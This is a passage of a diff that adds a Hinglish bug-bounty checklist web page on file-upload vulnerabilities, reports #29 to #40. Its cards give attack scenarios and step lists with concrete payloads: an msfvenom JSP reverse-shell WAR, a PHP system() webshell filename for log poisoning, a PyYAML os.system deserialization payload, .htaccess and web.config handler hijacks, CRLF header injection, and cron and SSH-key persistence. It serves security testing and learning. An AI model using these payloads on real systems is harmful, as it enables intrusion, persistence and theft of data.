+                                class="c">/tmp/test.txt</code> dalo, file wahan bani?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Web root overwrite try karo</strong> - <code
+                                class="c">/var/www/html/shell.php</code> direct RCE.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Config files target karo</strong> - <code
+                                class="c">.htaccess</code>, <code class="c">nginx.conf</code>, <code
+                                class="c">php.ini</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Cron job inject karo</strong> - <code
+                                class="c">/etc/cron.d/</code> mein scheduled reverse shell.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>SSH keys plant karo</strong> - <code
+                                class="c">authorized_keys</code> mein apni key add karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-30">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #30</div>
+                    <div class="report-title">Polyglot King - Multi-Format Exploit File</div>
+                    <div class="report-target">Target: Bug Bounty Platform - $8,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JPEG+PHP+HTML</span><span
+                            class="technique-tag">Context Switch</span><span class="technique-tag">Universal
+                            Payload</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Ek file jo JPEG bhi hai, PHP bhi hai, HTML bhi hai! Image validators
+                        pass, browser mein XSS, server par RCE. ExifTool + hex editor se craft karna padta hai. Ye
+                        "Nuclear Option" hai - jab kuch kaam nahi aata tab ye kaam aata hai!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Base image select karo</strong> - Valid JPEG/PNG jo validator pass
+                            kare.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>PHP code inject karo</strong> - Comment field ya after EOF
+                            marker.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>HTML/JS inject karo</strong> - XSS payload bhi dalo for
+                            client-side attack.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Multiple contexts test karo</strong> - File ko .jpg, .php, .html
+                            sab extensions se access karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Hex editor verify karo</strong> - Magic bytes intact? PHP tags
+                            proper? HTML valid?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- PHASE 7 - BUGCROWD BONUS -->
+<section class="phase-section" id="phase7">
+    <div class="phase-header"><span class="phase-number">BONUS</span><span class="phase-title">BUGCROWD BONUS -
+            .htaccess / Web.config / DOCX XXE / WAR-JAR / YAML / Log Poison / TTF / Electron / CRLF / WASM</span><span
+            class="phase-count" id="p7count">0 / 10 reports</span></div>
+    <div class="cards-grid" id="grid-phase7">
+
+        <div class="report-card" data-severity="critical" id="report-31">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #31</div>
+                    <div class="report-title">.htaccess Upload - Apache Config Hijack</div>
+                    <div class="report-target">Target: Shared Hosting - $3,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">AddType php</span><span
+                            class="technique-tag">php_value</span><span class="technique-tag">auto_prepend_file</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text"><code class="c">.htaccess</code> upload: <code
+                            class="c">AddType application/x-httpd-php .jpg</code>. Ab saari .jpg files PHP execute! Ya:
+                        <code class="c">php_value auto_prepend_file /etc/passwd</code> - har page par passwd leak!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>.htaccess upload karo</strong> - Dotfiles allowed hai? Extension
+                            filter check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>AddType directive test karo</strong> - <code class="c">.jpg</code>
+                            ko PHP execute bana do.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>auto_prepend_file use karo</strong> - Har PHP file ke pehle apna
+                            code run.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>AllowOverride check karo</strong> - <code class="c">None</code>
+                            hai toh .htaccess ignore hoga.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>ErrorDocument trick</strong> - Custom error pages se
+                            XSS/Phishing.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-32">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #32</div>
+                    <div class="report-title">Web.config Upload - IIS Handler Hijack</div>
+                    <div class="report-target">Target: .NET Enterprise App - $4,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">handlers</span><span
+                            class="technique-tag">aspx</span><span class="technique-tag">isapi</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text"><code class="c">web.config</code> upload: handlers section mein <code
+                            class="c">.jpg</code> ko ASPX handler se map. Ab image URL browse = code execute! IIS ka
+                        .htaccess equivalent!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>IIS detect karo</strong> - <code
+                                class="c">Server: Microsoft-IIS</code> header check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>web.config upload karo</strong> - handlers section mein custom
+                            mapping.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>ASPX webshell upload karo</strong> - .jpg extension par ASPX
+                            handler.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>CustomErrors override</strong> - Error pages se info
+                            disclosure.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>httpRuntime modify</strong> - Max upload size aur execution
+                            timeout change.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-33">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #33</div>
+                    <div class="report-title">DOCX/XLSX XXE - Office Document Injection</div>
+                    <div class="report-target">Target: Resume Parser - $5,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">[Content_Types].xml</span><span
+                            class="technique-tag">OOXML</span><span class="technique-tag">OOB Exfil</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">DOCX = ZIP file! Unzip karo - <code class="c">[Content_Types].xml</code>
+                        mein XXE entity inject - Rezip karo - Upload. Server parse karta hai - XXE trigger - <code
+                            class="c">/etc/passwd</code> ya AWS keys leak! Resume parsers sabse vulnerable!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Office upload dhoondho</strong> - Resume, Invoice, Template
+                            importers target karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>DOCX unzip karo</strong> - <code
+                                class="c">unzip resume.docx</code> se XML files extract.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>XXE inject karo</strong> - <code
+                                class="c">[Content_Types].xml</code> + <code class="c">document.xml</code> mein.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>OOB technique use karo</strong> - Blind XXE ke liye Burp
+                            Collaborator.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>XLSX/PPTX bhi try karo</strong> - Same OOXML structure, same
+                            attack!</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-34">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #34</div>
+                    <div class="report-title">WAR/JAR File Upload - Java App Server Takeover</div>
+                    <div class="report-target">Target: Tomcat Admin Panel - $6,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">.war deploy</span><span
+                            class="technique-tag">JSP Shell</span><span class="technique-tag">Manager App</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Tomcat Manager exposed. WAR file = deployable web app. <code
+                            class="c">msfvenom -p java/jsp_shell_reverse_tcp -f war -o shell.war</code>. Deploy via
+                        Manager - <code class="c">/shell/</code> URL available - Full server RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Tomcat/JBoss detect karo</strong> - <code
+                                class="c">/manager/html</code>, <code class="c">/jmx-console/</code> check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Default creds try karo</strong> - <code
+                                class="c">tomcat:tomcat</code>, <code class="c">admin:admin</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>WAR file craft karo</strong> - JSP webshell pack karo WAR
+                            mein.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Deploy via API</strong> - <code
+                                class="c">curl --upload-file shell.war</code> Tomcat deploy API.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Undeploy cleanup</strong> - Test ke baad shell undeploy karna mat
+                            bhoolna.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-35">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #35</div>
+                    <div class="report-title">YAML Deserialization - Config File RCE</div>
+                    <div class="report-target">Target: DevOps Dashboard - $5,500 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">!!python/object</span><span
+                            class="technique-tag">yaml.load()</span><span class="technique-tag">PyYAML</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Config file upload (.yml). YAML mein: <code
+                            class="c">!!python/object/apply:os.system ['id']</code>. Server <code
+                            class="c">yaml.load()</code> (unsafe) use karta - Python object deserialize - <code
+                            class="c">os.system('id')</code> execute - RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>YAML uploads dhoondho</strong> - CI/CD configs, Settings imports,
+                            Template uploads.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Python YAML payload test karo</strong> - <code
+                                class="c">!!python/object/apply:os.system</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Ruby YAML payload test karo</strong> - <code
+                                class="c">!!ruby/object:Gem::Installer</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Safe loader check karo</strong> - <code
+                                class="c">yaml.safe_load()</code> use ho raha toh attack fail.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>JSON fallback try karo</strong> - YAML nahi chala? JSON mein
+                            __proto__ pollution try karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-36">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #36</div>
+                    <div class="report-title">Log Poisoning via Upload - Access Log RCE</div>
+                    <div class="report-target">Target: Shared Hosting Provider - $3,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">access.log</span><span
+                            class="technique-tag">User-Agent</span><span class="technique-tag">LFI + Poison</span></div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Upload filename: <code
+                            class="c">&lt;?php system($_GET['c'])?&gt;.jpg</code>. Server log: <code
+                            class="c">[ERROR] Invalid file: &lt;?php system...&gt;.jpg</code>. LFI se log include: <code
+                            class="c">?page=../../../../var/log/apache2/error.log</code> - PHP code execute from log!
+                    </div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>LFI vulnerability dhoondho</strong> - File include parameters
+                            check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Log paths try karo</strong> - <code
+                                class="c">/var/log/apache2/</code>, <code class="c">/var/log/nginx/</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>PHP code inject karo</strong> - Filename, User-Agent header mein
+                            payload dalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Mail log try karo</strong> - SMTP se <code
+                                class="c">/var/log/mail.log</code> poison.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Session file poison</strong> - <code
+                                class="c">/tmp/sess_PHPSESSID</code> mein code inject.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-37">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #37</div>
+                    <div class="report-title">Font File Parsing - TTF/OTF Buffer Overflow</div>
+                    <div class="report-target">Target: Design Platform - $4,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">TTF Tables</span><span
+                            class="technique-tag">FreeType</span><span class="technique-tag">DoS / Memory Leak</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Custom font upload (.ttf/.otf). Malformed TTF table headers. FreeType
+                        library mein buffer overflow - Server crash (DoS) ya Memory leak se sensitive data expose!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Font upload dhoondho</strong> - Custom font, Icon set, Typography
+                            features.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Malformed TTF banao</strong> - Table headers mein invalid offsets
+                            dalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>FreeType version check karo</strong> - CVE database mein known
+                            vulns dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Memory limits test karo</strong> - Large glyph tables se OOM
+                            crash.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>SSRF via font URL</strong> - @font-face external fetch karta
+                            hai?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-38">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #38</div>
+                    <div class="report-title">Electron asar Archive - Desktop App RCE</div>
+                    <div class="report-target">Target: Desktop Collaboration App - $7,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">.asar</span><span
+                            class="technique-tag">nodeIntegration</span><span
+                            class="technique-tag">require('child_process')</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Electron app - file preview feature. Malicious .asar archive upload. App
+                        extract karta - <code class="c">require('child_process').exec('calc.exe')</code> - Node.js
+                        context mein RCE! Desktop apps ka sabse dangerous attack!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Electron app detect karo</strong> - <code
+                                class="c">resources/app.asar</code> file structure check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>nodeIntegration check karo</strong> - Enabled hai toh full Node.js
+                            access!</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>asar archive craft karo</strong> - <code
+                                class="c">npx asar pack ./malicious app.asar</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Preload script inject karo</strong> - Renderer process mein code
+                            inject.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Deep link exploit karo</strong> - Custom protocol handlers se
+                            trigger.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-39">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #39</div>
+                    <div class="report-title">CRLF Injection via Filename - Header Injection</div>
+                    <div class="report-target">Target: CDN Provider - $2,500 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">%0d%0a</span><span
+                            class="technique-tag">Set-Cookie</span><span class="technique-tag">Cache Poison</span></div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Filename: <code
+                            class="c">image%0d%0aSet-Cookie:admin=true%0d%0a.jpg</code>. Server filename ko
+                        Content-Disposition header mein reflect karta - CRLF se nayi header inject - Cookie set karke
+                        session hijack!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Header reflection check karo</strong> - Filename response headers
+                            mein dikhta hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>CRLF inject karo</strong> - <code class="c">%0d%0a</code> se new
+                            header line create.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Cookie injection test karo</strong> - <code
+                                class="c">Set-Cookie: admin=true</code> inject.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>XSS via header</strong> - Double CRLF se body inject karo (<code
+                                class="c">%0d%0a%0d%0a&lt;script&gt;</code>).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Cache poisoning</strong> - CDN cached response poison karo for
+                            mass attack.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-40">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #40</div>
+                    <div class="report-title">WebAssembly Upload - WASM Sandbox Escape</div>
+                    <div class="report-target">Target: Cloud IDE - $5,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">.wasm</span><span
+                            class="technique-tag">Memory Corruption</span><span class="technique-tag">WASI</span></div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Cloud IDE - custom WASM module upload. Malicious WASM: memory corruption
+                        exploit - sandbox escape - host system access! WASI (WebAssembly System Interface) enabled?
+                        Direct file system + network access!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>WASM upload dhoondho</strong> - Plugin systems, Serverless
+                            functions, Custom processors.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>WASI permissions check karo</strong> - Filesystem, Network,
+                            Environment access?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Memory limits test karo</strong> - Large memory allocation se
+                            crash (DoS).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Import functions exploit karo</strong> - Host functions ko
+                            malicious input do.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Resource exhaustion</strong> - Infinite loops, CPU + Memory bomb
+                            for DoS.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section><footer class="mission-footer">
+    <div class="footer-text">MISSION 13 COMPLETE - FILE UPLOAD VULNERABILITY MASTER - 40 REPORTS - 7 PHASES</div>
+    <div class="footer-text" style="margin-top:8px;color:#555">Bug Hunting Checklist by Bhai - HackerOne + Bugcrowd -
+        2026 Edition</div>
+</footer>
+<script>
+    const STORAGE_KEY = 'file_upload_checklist_v1';
+    function loadState() { try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {} } catch (e) { return {} } }
+    function saveState(s) { localStorage.setItem(STORAGE_KEY, JSON.stringify(s)) }
+    function toggleItem(el) { el.classList.toggle('done'); const s = loadState(); const card = el.closest('.report-card'); const cardId = card.id; if (!s[cardId]) s[cardId] = {}; const items = [...card.querySelectorAll('.checklist-item')]; const idx = items.indexOf(el); s[cardId][idx] = el.classList.contains('done'); saveState(s); updateCardProgress(card); updateMaster() }
+    function updateCardProgress(card) { const items = card.querySelectorAll('.checklist-item'); const done = card.querySelectorAll('.checklist-item.done'); const pct = items.length ? Math.round(done.length / items.length * 100) : 0; const pctEl = card.querySelector('.card-progress-pct'); const barEl = card.querySelector('.card-bar-fill'); if (pctEl) pctEl.textContent = pct + '%'; if (barEl) barEl.style.width = pct + '%' }
